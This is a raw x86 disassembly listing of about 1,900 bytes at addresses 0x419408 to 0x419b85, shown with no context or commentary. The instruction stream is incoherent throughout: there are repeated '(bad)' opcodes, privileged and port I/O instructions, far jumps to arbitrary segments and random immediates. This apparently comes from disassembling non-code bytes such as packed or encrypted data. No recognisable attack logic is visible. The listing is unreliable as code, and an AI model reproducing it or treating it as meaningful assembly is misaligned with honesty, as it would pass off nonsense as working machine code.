  419408:	mov    dh,0xeb
  41940a:	or     al,0x1a
  41940c:	pop    ecx
  41940d:	pmaddwd mm6,mm4
  419410:	inc    edi
  419411:	xchg   ebx,eax
  419412:	stc    
  419413:	adc    esp,ecx
  419415:	mov    esp,0x4c304c6d
  41941b:	dec    eax
  41941c:	(bad)  ds:0x4f1a0162
  419422:	imul   ecx,DWORD PTR ds:0x3be6b382,0xffffffe2
  419429:	sbb    bh,BYTE PTR [edx]
  41942b:	pop    eax
  41942c:	aam    0x8b
  41942e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41942f:	popa   
  419430:	jne    0x4194aa
  419432:	in     eax,dx
  419433:	inc    ecx
  419434:	mul    BYTE PTR [edi-0x41]
  419437:	push   ebx
  419438:	fild   QWORD PTR [ebx+esi*2]
  41943b:	mov    eax,ds:0x27702df
  419440:	and    dl,BYTE PTR [edx+0x4d]
  419443:	call   0x305:0xbe65345a
  41944a:	into   
  41944b:	sub    ah,bh
  41944d:	mov    esi,0xcf81ec46
  419452:	mov    dh,0x26
  419454:	ret    0x410e
  419457:	jb     0x41948e
  419459:	sbb    DWORD PTR [ebx+ebp*4],0x6b
  41945d:	pop    ss
  41945e:	xor    DWORD PTR [ebp-0x54],0x50
  419462:	fcmovnbe st,st(4)
  419464:	cmp    bl,bl
  419466:	and    DWORD PTR [edi],edx
  419468:	fidivr DWORD PTR [ecx+0x17867feb]
  41946e:	ds jnp 0x4194cc
  419471:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419472:	sub    eax,0x8f3c9619
  419477:	sbb    eax,0x8ab85d58
  41947c:	pop    edx
  41947d:	in     al,0x8e
  41947f:	in     al,0xd4
  419481:	je     0x41941f
  419483:	add    BYTE PTR [eax+0x7c],dl
  419486:	sbb    dh,ah
  419488:	dec    esi
  419489:	xchg   ebp,eax
  41948a:	adc    DWORD PTR [edx+0x5c],ebx
  41948d:	in     al,0xc1
  41948f:	mov    ah,0xe
  419491:	mov    esp,ecx
  419493:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419494:	mov    esi,0xf7189ff8
  419499:	jmp    0x4194c9
  41949b:	jbe    0x41947d
  41949d:	fwait
  41949e:	push   DWORD PTR [ecx+edi*4]
  4194a1:	jmp    0x7b4809f9
  4194a6:	ins    BYTE PTR es:[edi],dx
  4194a7:	mov    ecx,DWORD PTR [esi]
  4194a9:	ins    BYTE PTR es:[edi],dx
  4194aa:	addr16 push ss
  4194ac:	cmp    ch,BYTE PTR ds:0x760bbba6
  4194b2:	cmp    dh,bl
  4194b4:	pushw  0xffa7
  4194b7:	das    
  4194b8:	ins    DWORD PTR es:[edi],dx
  4194b9:	pop    ss
  4194ba:	cmp    DWORD PTR [edx],ebx
  4194bc:	lahf   
  4194bd:	pop    esi
  4194be:	lds    edx,FWORD PTR [eax-0x72a393a2]
  4194c4:	sub    DWORD PTR [edi-0x54],0xffffffff
  4194c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194c9:	cmove  edi,DWORD PTR [edx+eiz*1-0x61]
  4194ce:	rol    BYTE PTR [ecx],cl
  4194d0:	jg     0x41947d
  4194d2:	pop    edx
  4194d3:	jmp    0x419511
  4194d5:	ss ret 0xd2de
  4194d9:	inc    ebp
  4194da:	lahf   
  4194db:	lods   al,BYTE PTR ds:[esi]
  4194dc:	add    edi,DWORD PTR [edx-0x57a30df7]
  4194e2:	jo     0x41950a
  4194e4:	retf   
  4194e5:	mov    ds:0xe3c8ec4e,al
  4194ea:	call   0x1c9d036c
  4194ef:	adc    eax,0x427d2ea7
  4194f4:	jg     0x4194d9
  4194f6:	loopne 0x419566
  4194f8:	or     ebp,ecx
  4194fa:	pushf  
  4194fb:	stc    
  4194fc:	sahf   
  4194fd:	popf   
  4194fe:	ficom  WORD PTR [ecx-0x24]
  419501:	mov    dl,0x97
  419503:	push   es
  419504:	jbe    0x419578
  419506:	in     al,dx
  419507:	(bad)  
  419508:	hlt    
  419509:	fidiv  WORD PTR [bp+di+0x509d]
  41950e:	jnp    0x419507
  419510:	and    al,0xcc
  419512:	inc    edi
  419513:	push   0xffffffef
  419515:	pushf  
  419516:	dec    eax
  419517:	fadd   QWORD PTR [ecx+eax*8-0x4]
  41951b:	pop    ebx
  41951c:	clc    
  41951d:	pop    eax
  41951e:	stos   DWORD PTR es:[edi],eax
  41951f:	(bad)  [ecx+ebp*4]
  419522:	or     DWORD PTR [ecx+0x46ce26ba],ecx
  419528:	mov    ah,0x2e
  41952a:	data16 xor cl,dl
  41952d:	xchg   ebx,eax
  41952e:	adc    al,0x62
  419530:	cmp    al,0x1c
  419532:	adc    DWORD PTR [ebx+eiz*1+0x26],edx
  419536:	imul   ebp,eax,0x18
  419539:	out    dx,eax
  41953a:	mov    dh,0x37
  41953c:	fcomp  DWORD PTR [edi-0x6a]
  41953f:	cmp    BYTE PTR [ecx-0x12],cl
  419542:	outs   dx,BYTE PTR ds:[esi]
  419543:	lahf   
  419544:	stc    
  419545:	adc    al,ch
  419547:	dec    esp
  419548:	in     al,dx
  419549:	out    0xed,eax
  41954b:	adc    DWORD PTR [eax-0x448d4fcb],eax
  419551:	push   esp
  419552:	lods   eax,DWORD PTR ds:[esi]
  419553:	shl    BYTE PTR [edx-0x62],0x6b
  419557:	pop    edi
  419558:	pop    edi
  419559:	xchg   esp,eax
  41955a:	out    0x8b,al
  41955c:	into   
  41955d:	mov    ds:0x7e0cd56a,eax
  419562:	push   ecx
  419563:	scas   eax,DWORD PTR es:[edi]
  419564:	jle    0x41958a
  419566:	inc    ebp
  419567:	xlat   BYTE PTR ds:[ebx]
  419568:	push   0xfffffffc
  41956a:	add    esi,edx
  41956c:	pop    ds
  41956d:	sti    
  41956e:	push   es
  41956f:	jmp    0x4195b1
  419571:	mov    cl,0x7f
  419573:	retf   
  419574:	aam    0xd
  419576:	ss dec esi
  419578:	xchg   esi,eax
  419579:	rcr    BYTE PTR [ebx-0x18],0x94
  41957d:	sub    ch,dl
  41957f:	mov    al,0xde
  419581:	pop    edi
  419582:	cmp    BYTE PTR [edx],al
  419584:	jmp    0x3939:0x9ec9ab3f
  41958b:	pop    ss
  41958c:	dec    eax
  41958d:	jge    0x419541
  41958f:	aam    0x93
  419591:	xor    DWORD PTR [edi-0x1],edx
  419594:	adc    esp,DWORD PTR [esi+ecx*2]
  419597:	xchg   ebx,eax
  419598:	rcr    ebx,0x3
  41959b:	or     edx,0xffffff8a
  41959e:	inc    eax
  41959f:	loop   0x4195e0
  4195a1:	xor    esi,DWORD PTR [ecx-0x60]
  4195a4:	inc    ecx
  4195a5:	add    eax,0xd85f6c0c
  4195aa:	cmp    ebp,esi
  4195ac:	jmp    0x7e8f204b
  4195b1:	jmp    0xc2b90ef6
  4195b6:	xor    al,0xf7
  4195b8:	jbe    0x41958a
  4195ba:	mov    edx,0x91393793
  4195bf:	mov    WORD PTR [ecx],fs
  4195c1:	jbe    0x419598
  4195c3:	loope  0x4195b7
  4195c5:	mov    bl,0x57
  4195c7:	fist   WORD PTR [esi-0x32]
  4195ca:	mov    esi,0xe1c327a3
  4195cf:	shl    DWORD PTR [ecx],0x3e
  4195d2:	mov    edx,0x8c7dfe63
  4195d7:	inc    esi
  4195d8:	daa    
  4195d9:	sub    edx,DWORD PTR [ecx]
  4195db:	sar    bl,cl
  4195dd:	out    dx,al
  4195de:	in     al,0xac
  4195e0:	pusha  
  4195e1:	push   cs
  4195e2:	cmp    BYTE PTR [esi+0x68930188],0xe9
  4195e9:	mov    bh,0x4d
  4195eb:	nop
  4195ec:	test   eax,0xf12f6b15
  4195f1:	ds loope 0x419595
  4195f4:	push   ebx
  4195f5:	or     eax,0x5079378b
  4195fa:	push   cs
  4195fb:	xchg   edi,eax
  4195fc:	mov    ds:0xd1ae31fe,al
  419601:	daa    
  419602:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419603:	jnp    0x4195c9
  419605:	and    DWORD PTR [edx-0x50],ebx
  419608:	bound  ebp,QWORD PTR ds:0x1087f692
  41960e:	in     eax,dx
  41960f:	add    ah,BYTE PTR [esi]
  419611:	sub    eax,0x90a21825
  419616:	sbb    ebp,DWORD PTR [ebx-0x2f3b0a4b]
  41961c:	inc    esi
  41961d:	push   ebp
  41961e:	jae    0x419676
  419620:	dec    esp
  419621:	mov    al,0x9e
  419623:	je     0x419674
  419625:	mov    WORD PTR [ebp-0x4b],ds
  419628:	test   dh,ah
  41962a:	xor    cl,dl
  41962c:	data16 xchg bh,ch
  41962f:	ret    0x46b7
  419632:	adc    dh,bl
  419634:	mov    cl,0xc1
  419636:	sti    
  419637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419638:	pop    esi
  419639:	fs push ebp
  41963b:	jne    0x41967f
  41963d:	retf   
  41963e:	mov    bh,0x1
  419640:	adc    DWORD PTR [ecx+0x62],esi
  419643:	clc    
  419644:	inc    ebp
  419645:	loope  0x41965d
  419647:	pop    esp
  419648:	call   0xa5a6db3b
  41964d:	pop    eax
  41964e:	sbb    dl,BYTE PTR [edx+eax*4]
  419651:	push   cs
  419652:	or     esi,ecx
  419654:	mov    BYTE PTR ds:0x1822de92,dl
  41965a:	(bad)  
  41965b:	sahf   
  41965c:	pop    eax
  41965d:	mov    esi,0x9cacf91c
  419662:	iret   
  419663:	test   ebx,ecx
  419665:	test   al,0x9e
  419667:	stc    
  419668:	push   0xb7c82abb
  41966d:	int    0xcf
  41966f:	gs adc al,0x5f
  419672:	or     BYTE PTR [edx],ah
  419674:	int3   
  419675:	xchg   ebx,eax
  419676:	xor    bl,bl
  419678:	jecxz  0x4196db
  41967a:	test   BYTE PTR [ebx+0xc96862c],dl
  419680:	pushf  
  419681:	test   eax,ecx
  419683:	and    edi,DWORD PTR [ebx+0x2c1f6db3]
  419689:	jns    0x4196d1
  41968b:	int3   
  41968c:	dec    eax
  41968d:	wrmsr  
  41968f:	adc    al,BYTE PTR [edx-0x75fe6ad]
  419695:	idiv   DWORD PTR [edx]
  419697:	xor    DWORD PTR cs:[eax+0x67],esp
  41969b:	mov    al,ds:0x39b0e16
  4196a0:	or     ebx,esi
  4196a2:	mov    ch,0x32
  4196a4:	add    ecx,ebx
  4196a6:	daa    
  4196a7:	and    bh,BYTE PTR [edx]
  4196a9:	in     eax,0x55
  4196ab:	and    al,0xa3
  4196ad:	mov    ch,0x10
  4196af:	adc    eax,0x3c99ab22
  4196b4:	or     eax,0x5a17003e
  4196b9:	adc    DWORD PTR [eax-0x26],eax
  4196bc:	icebp  
  4196bd:	adc    ch,BYTE PTR [esp+edi*1]
  4196c0:	fisubr WORD PTR [edi+0x6c]
  4196c3:	xchg   esi,eax
  4196c4:	inc    ecx
  4196c5:	or     DWORD PTR [ebx+edx*4],edi
  4196c8:	or     esi,DWORD PTR [edx+0x570dd3b]
  4196ce:	inc    ebp
  4196cf:	add    DWORD PTR ds:0x58a0c2db,edi
  4196d5:	or     dl,BYTE PTR [ebp-0x260272f4]
  4196db:	addr16 mov ds:0xf632,al
  4196df:	out    dx,eax
  4196e0:	adc    al,0x49
  4196e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196e3:	lock outs dx,DWORD PTR ds:[esi]
  4196e5:	fwait
  4196e6:	arpl   WORD PTR [edx],bx
  4196e8:	int    0x1a
  4196ea:	or     dh,BYTE PTR [edi+0x7bc76f76]
  4196f0:	jns    0x41968b
  4196f2:	push   ebx
  4196f3:	cmp    al,0x8e
  4196f5:	mov    al,ds:0xbe7da483
  4196fa:	je     0x4196e6
  4196fc:	pop    eax
  4196fd:	loope  0x419691
  4196ff:	xor    eax,0xfa8c4193
  419704:	imul   eax,esi,0xffffffae
  419707:	les    esp,FWORD PTR [ecx-0x30]
  41970a:	scas   al,BYTE PTR es:[edi]
  41970b:	jecxz  0x4196d0
  41970d:	or     bl,BYTE PTR [esi+0xb659c02]
  419713:	xor    BYTE PTR [esi-0x3181c3a7],bl
  419719:	sub    BYTE PTR [edx+eiz*4],0x1f
  41971d:	or     dl,dl
  41971f:	push   ecx
  419720:	inc    eax
  419721:	mov    edi,0xbd07f7cf
  419726:	sbb    bh,BYTE PTR [ecx-0xf]
  419729:	mov    ebp,0x12f45b86
  41972e:	pop    edx
  41972f:	mov    bl,0x67
  419731:	mov    edi,0xca55d850
  419736:	mov    ds:0x4c9131db,eax
  41973b:	dec    edx
  41973c:	push   esi
  41973d:	das    
  41973e:	sbb    BYTE PTR [esi],bl
  419740:	mov    al,0xe0
  419742:	fistp  WORD PTR [edi]
  419744:	or     ebp,DWORD PTR [edi-0x58]
  419747:	pop    edx
  419748:	xchg   ebp,eax
  419749:	push   cs
  41974a:	loope  0x41978e
  41974c:	js     0x419762
  41974e:	mov    dh,0xce
  419750:	test   cl,ch
  419752:	inc    edx
  419753:	inc    edi
  419754:	inc    ebx
  419755:	push   edx
  419756:	aam    0x5a
  419758:	jmp    0x4197ca
  41975a:	inc    edi
  41975b:	test   DWORD PTR [eax+0x63],esp
  41975e:	sbb    al,0x7b
  419761:	mov    esi,0x2866d24b
  419766:	and    ebp,ecx
  419768:	mov    bl,0xe1
  41976a:	(bad)  
  41976b:	or     dh,BYTE PTR [ecx-0x3d38449d]
  419771:	test   ebp,ebp
  419773:	(bad)  
  419775:	ror    DWORD PTR [ebp-0x6f],cl
  419778:	inc    eax
  419779:	mov    ah,0xce
  41977b:	mov    ebp,DWORD PTR [ecx-0x4d]
  41977e:	add    DWORD PTR [eax-0x9],esi
  419781:	push   es
  419782:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419783:	loopne 0x419762
  419785:	add    eax,0x67653df0
  41978a:	adc    ecx,DWORD PTR ds:0x473d80ee
  419790:	pop    eax
  419791:	fwait
  419792:	push   esi
  419793:	dec    esp
  419794:	adc    eax,0x42f177bc
  419799:	adc    BYTE PTR [edx+0x66c69481],0xc5
  4197a0:	(bad)  
  4197a1:	jmp    0x41981c
  4197a3:	fnsave [ebp+0x20e31b1]
  4197a9:	inc    esp
  4197aa:	push   0xffffffea
  4197ac:	cmc    
  4197ad:	cmp    dh,dh
  4197af:	and    al,dl
  4197b1:	adc    al,0xd
  4197b3:	pcmpeqb mm1,QWORD PTR fs:[edi]
  4197b7:	ficom  WORD PTR [ebx-0x2393b001]
  4197bd:	(bad)  
  4197bf:	cmp    bl,BYTE PTR ds:[ebx+0x76]
  4197c3:	lock js 0x41978b
  4197c6:	inc    edi
  4197c7:	scas   eax,DWORD PTR es:[edi]
  4197c8:	push   0x94982be
  4197cd:	ror    DWORD PTR [ecx+0x57a3fca0],0xd4
  4197d4:	xchg   ebx,eax
  4197d5:	dec    esi
  4197d6:	sbb    DWORD PTR [ebp+0x43b05cc8],ebx
  4197dc:	cmp    eax,0x1d6353e0
  4197e1:	hlt    
  4197e2:	adc    dh,BYTE PTR [edx+ebp*4-0x79]
  4197e6:	xor    DWORD PTR [ebx-0x7327ec12],ebx
  4197ec:	scas   al,BYTE PTR es:[edi]
  4197ed:	xor    cl,ch
  4197ef:	dec    esp
  4197f0:	fstp   TBYTE PTR [ebx+0xa]
  4197f3:	add    al,0xc3
  4197f5:	and    al,0xfb
  4197f7:	inc    ebx
  4197f8:	xor    ebp,DWORD PTR [edi+eiz*1]
  4197fb:	or     BYTE PTR [eax+0x73],ah
  4197fe:	and    ebp,DWORD PTR [ebx-0x61e6683b]
  419804:	adc    ecx,DWORD PTR [esi-0x5f]
  419807:	sahf   
  419808:	outs   dx,BYTE PTR ds:[esi]
  419809:	fild   QWORD PTR [ecx-0x790163d8]
  41980f:	fisttp DWORD PTR [ebx]
  419811:	jle    0x4197be
  419813:	popf   
  419814:	sti    
  419815:	bound  edx,QWORD PTR [edi-0x1b]
  419818:	xlat   BYTE PTR ds:[ebx]
  419819:	push   ss
  41981a:	or     esp,ecx
  41981c:	sti    
  41981d:	dec    esp
  41981e:	pop    edi
  41981f:	(bad)  
  419821:	(bad)
  419824:	loop   0x419837
  419826:	ret    0xb870
  419829:	leave  
  41982a:	std    
  41982b:	push   cs
  41982c:	jg     0x4198ac
  41982e:	test   edi,esp
  419830:	aas    
  419831:	xchg   ebp,eax
  419832:	pusha  
  419833:	in     eax,0x67
  419835:	jmp    0xe5f3ed5d
  41983a:	pop    ss
  41983b:	icebp  
  41983c:	jle    0x4198b9
  41983e:	xchg   edx,eax
  41983f:	stos   BYTE PTR es:[edi],al
  419840:	mov    cl,0xe3
  419842:	inc    esi
  419843:	das    
  419844:	les    ecx,FWORD PTR [edi]
  419846:	stos   BYTE PTR es:[edi],al
  419847:	int    0xcd
  419849:	arpl   WORD PTR [edx+ebp*4],bx
  41984c:	(bad)  
  41984e:	popf   
  41984f:	out    dx,eax
  419850:	or     al,0x19
  419852:	inc    BYTE PTR [edx-0x80]
  419855:	jnp    0x419822
  419857:	clc    
  419858:	lods   eax,DWORD PTR ds:[esi]
  419859:	adc    al,0x51
  41985b:	fwait
  41985c:	test   DWORD PTR [ebp-0x6b3776f4],ecx
  419862:	out    dx,eax
  419863:	popf   
  419864:	mov    al,ds:0x7b4b5ef5
  419869:	or     BYTE PTR [ecx],bh
  41986b:	inc    esi
  41986c:	out    dx,al
  41986d:	jmp    0x4198ae
  41986f:	je     0x4198c0
  419871:	mov    ebp,0x5970292b
  419876:	gs hlt 
  419878:	ss push edx
  41987a:	retf   0x4333
  41987d:	iret   
  41987e:	jo     0x419800
  419880:	(bad)  
  419881:	inc    ecx
  419882:	outs   dx,DWORD PTR ds:[esi]
  419883:	sti    
  419884:	ins    DWORD PTR es:[edi],dx
  419885:	pop    edx
  419886:	bound  esp,QWORD PTR [eax]
  419888:	mov    al,0x87
  41988a:	jb     0x41985a
  41988c:	push   ecx
  41988d:	add    BYTE PTR ss:[esi],al
  419890:	cmp    DWORD PTR [edi],eax
  419892:	mov    ecx,0x70a69940
  419897:	std    
  419898:	cmp    al,0xe0
  41989a:	mov    esp,0xdf8645b7
  41989f:	mov    bh,0x58
  4198a1:	push   es
  4198a2:	stc    
  4198a3:	sahf   
  4198a4:	jg     0x4198f4
  4198a6:	add    esi,ebx
  4198a8:	or     eax,0x9353749a
  4198ad:	dec    esi
  4198ae:	imul   edx,DWORD PTR [ebx],0x2d
  4198b1:	iret   
  4198b2:	xchg   esp,eax
  4198b3:	shl    BYTE PTR [edi-0x48e82da7],cl
  4198b9:	xor    DWORD PTR [eax],ecx
  4198bb:	fst    st(0)
  4198bd:	(bad)  
  4198be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198bf:	xor    al,dl
  4198c1:	sub    al,0xcb
  4198c3:	sbb    eax,0x53e2ff1a
  4198c8:	mov    dl,0xfd
  4198ca:	ret    0x107
  4198cd:	icebp  
  4198ce:	mov    DWORD PTR [edx-0xf1e85ea],eax
  4198d4:	cwde   
  4198d5:	mov    cl,0xdb
  4198d7:	jbe    0x41994e
  4198d9:	mov    ds:0x34ce6054,eax
  4198de:	test   edi,esp
  4198e0:	jbe    0x41986e
  4198e2:	clc    
  4198e3:	jp     0x4198f8
  4198e5:	loopne 0x4198f6
  4198e7:	lds    ebx,FWORD PTR [esi]
  4198e9:	sub    al,0xb4
  4198eb:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198ed:	js     0x419961
  4198ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198f0:	or     al,0xe0
  4198f2:	popa   
  4198f3:	mov    WORD PTR [ecx-0x78],?
  4198f6:	add    eax,0xfddcad57
  4198fb:	aam    0xe2
  4198fd:	stos   DWORD PTR es:[edi],eax
  4198fe:	push   ecx
  4198ff:	sub    cl,dl
  419901:	bound  esi,QWORD PTR [edi+0xd]
  419904:	push   ss
  419905:	test   eax,0xaac0cd0f
  41990a:	push   ebp
  41990b:	std    
  41990c:	dec    esi
  41990d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41990e:	xchg   ebp,eax
  41990f:	dec    ecx
  419910:	inc    edx
  419911:	enter  0xe19e,0x41
  419915:	pop    edi
  419916:	mov    cl,0x50
  419918:	aaa    
  419919:	ins    BYTE PTR es:[edi],dx
  41991a:	push   edx
  41991b:	push   ebx
  41991c:	sbb    al,0xbe
  41991e:	test   DWORD PTR [ebx],ebx
  419920:	mov    al,ds:0xffd196ee
  419925:	or     eax,DWORD PTR [esi-0x7a215195]
  41992b:	out    0x7d,eax
  41992d:	daa    
  41992e:	mov    esi,0x21b224fe
  419933:	sub    ebp,DWORD PTR [ebx+0x42ff532e]
  419939:	or     cl,cl
  41993b:	ror    DWORD PTR [ebx-0x166d3b],0x94
  419942:	sbb    esi,eax
  419944:	xor    eax,0xe591995c
  419949:	jmp    0x5e1f:0x5bf0a77c
  419950:	int    0xd3
  419952:	nop
  419953:	aam    0x16
  419955:	and    al,0x24
  419957:	rcr    DWORD PTR [esi+0x202c564a],0x1
  41995e:	aas    
  41995f:	sti    
  419960:	test   eax,0xe53cde61
  419965:	sub    DWORD PTR [edi],eax
  419967:	push   ebx
  419968:	mov    eax,ebp
  41996a:	gs jg  0x419909
  41996d:	pop    eax
  41996e:	shl    BYTE PTR [edx],1
  419970:	mov    ebx,DWORD PTR [edi-0x3ae9b27e]
  419976:	jl     0x4199c2
  419978:	and    ecx,DWORD PTR [ebp+0x7d47b903]
  41997e:	jmp    edi
  419980:	jmp    0x9c2f5a51
  419985:	leave  
  419986:	jmp    0x41991f
  419988:	(bad)  [eax+0x26]
  41998b:	push   ebx
  41998c:	mov    al,ds:0xd737212
  419991:	pop    ds
  419992:	jb     0x41996f
  419994:	mov    ch,0x6a
  419996:	mov    esi,0x66dcff40
  41999b:	stc    
  41999c:	push   esp
  41999d:	add    al,0x81
  41999f:	mov    bl,0xce
  4199a1:	lods   eax,DWORD PTR ds:[esi]
  4199a2:	in     al,dx
  4199a3:	xor    al,0x9b
  4199a5:	or     dh,BYTE PTR [edi+eax*1+0x1a]
  4199a9:	mov    WORD PTR [ebx-0x40],?
  4199ac:	nop
  4199ad:	rol    BYTE PTR [ebx+eax*2-0x7c816e7e],cl
  4199b4:	inc    eax
  4199b5:	mov    WORD PTR [esi],cs
  4199b7:	outs   dx,BYTE PTR ds:[esi]
  4199b8:	sub    DWORD PTR [ecx],ebx
  4199ba:	push   ds
  4199bb:	and    edx,DWORD PTR [eax]
  4199bd:	sub    al,0xd2
  4199bf:	in     al,0x43
  4199c1:	adc    BYTE PTR [edi],al
  4199c3:	push   ebp
  4199c4:	adc    al,0x6b
  4199c6:	push   cs
  4199c7:	(bad)  
  4199c9:	out    0x1b,al
  4199cb:	pop    edi
  4199cc:	dec    ebx
  4199cd:	(bad)  
  4199ce:	iret   
  4199cf:	or     al,0xfc
  4199d1:	mov    ebx,0x38d86881
  4199d6:	popf   
  4199d7:	cmpxchg DWORD PTR [edx+0x537de762],esp
  4199de:	les    esi,FWORD PTR [eax-0x6a]
  4199e1:	repz ss push ecx
  4199e4:	adc    edx,0x19f46762
  4199ea:	je     0x4199cd
  4199ec:	xor    al,0xf
  4199ee:	jp     0x419981
  4199f0:	ss jp  0x41999d
  4199f3:	les    esp,FWORD PTR [edi+ebx*1]
  4199f6:	stos   BYTE PTR es:[edi],al
  4199f7:	add    al,0xcd
  4199f9:	stos   BYTE PTR es:[edi],al
  4199fa:	loope  0x419a69
  4199fc:	loope  0x4199bc
  4199fe:	adc    al,0xa3
  419a00:	stos   BYTE PTR es:[edi],al
  419a01:	add    dl,BYTE PTR [ebp-0xe8f94ab]
  419a07:	sub    eax,0x3287e72e
  419a0c:	pop    ebp
  419a0d:	adc    edx,esp
  419a0f:	adc    al,0x9c
  419a11:	dec    esp
  419a12:	pop    ecx
  419a13:	test   BYTE PTR [ebp-0x36],ch
  419a16:	and    DWORD PTR [edx-0x37],ecx
  419a19:	fdiv   DWORD PTR [edi]
  419a1b:	mov    dl,0xe0
  419a1d:	xor    BYTE PTR [edx],0xf
  419a20:	stos   BYTE PTR es:[edi],al
  419a21:	adc    DWORD PTR [eax],0xffffffff
  419a24:	test   al,0xd6
  419a26:	pushf  
  419a27:	dec    edx
  419a28:	mov    cl,0xc
  419a2a:	pop    esi
  419a2b:	and    DWORD PTR [edx-0x3d],esp
  419a2e:	and    edx,esi
  419a30:	cmp    eax,0xe1348bad
  419a35:	lock into 
  419a37:	ds push ss
  419a39:	and    bh,BYTE PTR [esi-0x77]
  419a3c:	out    0xd9,eax
  419a3e:	add    bh,BYTE PTR [eax+edx*1+0x3636a7e0]
  419a45:	in     al,0xf6
  419a47:	push   ebx
  419a48:	je     0x419a89
  419a4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a4b:	adc    DWORD PTR [ecx],edi
  419a4d:	xlat   BYTE PTR ds:[ebx]
  419a4e:	sub    BYTE PTR [ebx+0x4366394b],bl
  419a54:	adc    ch,BYTE PTR [esi+edi*4-0x4c]
  419a58:	fisttp QWORD PTR [ebx+eax*2-0x5c83445e]
  419a5f:	ds jg  0x4199f7
  419a62:	pushf  
  419a63:	add    ah,BYTE PTR [ebx]
  419a65:	lds    edx,FWORD PTR [ebp+0x7d9d2540]
  419a6b:	rcr    BYTE PTR [ecx],cl
  419a6d:	arpl   WORD PTR [ebx+0x1d],bx
  419a70:	out    dx,eax
  419a71:	mov    esi,0xad9b7c41
  419a76:	xchg   edx,eax
  419a77:	clc    
  419a78:	pop    edi
  419a79:	test   al,0x20
  419a7b:	mov    DWORD PTR [ecx],ebx
  419a7d:	xor    esi,DWORD PTR [ebx-0x1dd6e506]
  419a83:	mov    bh,0x51
  419a85:	mov    edx,0x58bab770
  419a8a:	sahf   
  419a8b:	das    
  419a8c:	add    dl,BYTE PTR [ebx-0x3efadc5c]
  419a92:	pop    esi
  419a93:	mov    bl,0x3c
  419a95:	sub    al,0x9b
  419a97:	sar    ch,cl
  419a99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a9a:	shr    BYTE PTR [edx],cl
  419a9c:	mov    cl,0x92
  419a9e:	pop    esi
  419a9f:	in     eax,0x96
  419aa1:	add    ecx,DWORD PTR [esi+edi*2+0x41]
  419aa5:	sub    DWORD PTR [edi],0xffffffdd
  419aa8:	mov    ds,WORD PTR [eax+eax*8]
  419aab:	(bad)  
  419aac:	mov    bh,0x86
  419aae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419aaf:	xor    DWORD PTR [ebx+0x7676ee69],ebp
  419ab5:	pusha  
  419ab6:	shr    DWORD PTR [si],1
  419ab9:	fisttp WORD PTR ds:0x4b0dc4bb
  419abf:	cwde   
  419ac0:	inc    ebx
  419ac1:	sbb    BYTE PTR [edi+edi*4-0x67],0x8f
  419ac6:	push   esi
  419ac7:	stc    
  419ac8:	(bad)  
  419aca:	int3   
  419acb:	ret    0xc57d
  419ace:	jl     0x419aa1
  419ad0:	cmp    al,0xb1
  419ad2:	sub    dl,BYTE PTR [edx-0x29]
  419ad5:	pop    esi
  419ad6:	push   ds
  419ad7:	dec    esp
  419ad8:	int3   
  419ad9:	mov    bh,0xa0
  419adb:	mov    al,0x93
  419add:	outs   dx,BYTE PTR ds:[esi]
  419ade:	add    DWORD PTR [ebp+eax*2-0x56],ebx
  419ae2:	ds hlt 
  419ae4:	or     DWORD PTR [esi],0x51ab6b67
  419aea:	add    al,0x6b
  419aec:	push   edx
  419aed:	jge    0x419a80
  419aef:	pop    eax
  419af0:	push   edi
  419af1:	enter  0x6c02,0x38
  419af5:	sahf   
  419af6:	push   es
  419af7:	xor    DWORD PTR [edx],esp
  419af9:	dec    ebp
  419afa:	stc    
  419afb:	lock xor al,BYTE PTR [esi+edx*4+0x54]
  419b00:	adc    BYTE PTR [ebx-0x6c8b4c75],dl
  419b06:	es mov ecx,0x2cae3ce5
  419b0c:	aad    0x34
  419b0e:	push   ebx
  419b0f:	mov    ds:0x64d0d6b4,eax
  419b14:	sub    eax,0x793ae35d
  419b19:	pop    edi
  419b1a:	pop    ss
  419b1b:	cmp    dl,BYTE PTR [eax]
  419b1d:	(bad)  
  419b1f:	cmp    al,0x6c
  419b21:	in     al,0x37
  419b23:	sub    DWORD PTR [ebx+eax*8+0x1c],edx
  419b27:	push   ecx
  419b28:	pop    ebx
  419b29:	mov    dl,0xb8
  419b2b:	sub    BYTE PTR [edx+esi*2],al
  419b2e:	inc    edi
  419b2f:	outs   dx,BYTE PTR ds:[esi]
  419b30:	imul   edx,DWORD PTR [edi+0x55],0xa6e007d7
  419b37:	shr    BYTE PTR [ebx+0x29d2dfb8],0xd3
  419b3e:	ja     0x419ad5
  419b40:	mov    eax,ds:0xf817ac34
  419b45:	mov    ds:0xb273ecc9,eax
  419b4a:	xor    bl,BYTE PTR [eax-0x69]
  419b4d:	lods   eax,DWORD PTR ds:[esi]
  419b4e:	and    cl,BYTE PTR [esi]
  419b50:	lock test DWORD PTR [edx+0x50],ebp
  419b54:	ins    DWORD PTR es:[edi],dx
  419b55:	sub    DWORD PTR [eax+0x4269578d],ebp
  419b5b:	dec    ecx
  419b5c:	push   ss
  419b5d:	jle    0x419b83
  419b5f:	stos   BYTE PTR es:[edi],al
  419b60:	stos   DWORD PTR es:[edi],eax
  419b61:	ffreep st(4)
  419b63:	mov    ah,0x75
  419b65:	push   edi
  419b66:	pop    ebx
  419b67:	sub    BYTE PTR [esi-0x68e34713],dh
  419b6d:	lea    ecx,[edi]
  419b6f:	clc    
  419b70:	stos   DWORD PTR es:[edi],eax
  419b71:	or     eax,DWORD PTR [ebp-0x28]
  419b74:	mov    bl,0xc4
  419b76:	xchg   BYTE PTR [esi-0x61],dh
  419b79:	call   0xc362:0x61f2147c
  419b80:	retf   0x389
  419b83:	xchg   edi,eax
  419b84:	push   esi
  419b85:	inc    esi
